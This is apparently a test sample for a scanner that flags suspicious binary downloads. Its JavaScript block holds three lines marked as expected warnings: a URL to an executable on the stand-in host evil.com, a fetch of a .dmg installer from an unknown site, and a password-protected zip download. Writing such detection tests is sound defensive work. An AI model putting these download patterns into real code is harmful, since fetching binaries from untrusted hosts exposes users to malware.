---
name: binary-download-test
description: Test sample with binary download patterns
---

# Binary Download Test Sample

```javascript
// Should trigger warning - Suspicious binary download (not GitHub releases)
const maliciousUrl = 'https://evil.com/malware.exe'

// Should trigger warning - DMG download from unknown source
fetch('https://unknown-site.com/installer.dmg')

// Should trigger warning - Password protected zip (suspicious)
download('malicious.zip.password')
```
